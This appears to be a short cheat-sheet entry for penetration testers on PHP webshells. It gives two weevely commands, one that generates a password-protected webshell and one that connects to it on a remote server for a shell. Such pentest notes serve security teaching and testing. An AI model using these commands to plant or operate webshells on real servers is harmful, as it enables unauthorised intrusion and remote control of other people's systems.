# Webshells

## PHP

These are the most common types of shells we'll be turning to, as like it or not, PHP is probably the most common type of web server application.

### weevely

Using [weevely](https://github.com/epinna/weevely3) we can create php webshells:

```bash
weevely generate password /root/webshell.php
```

Now we execute it, point it to the remote page and get a shell in return:

```bash
weevely "http://192.168.1.101/webshell.php" password
```

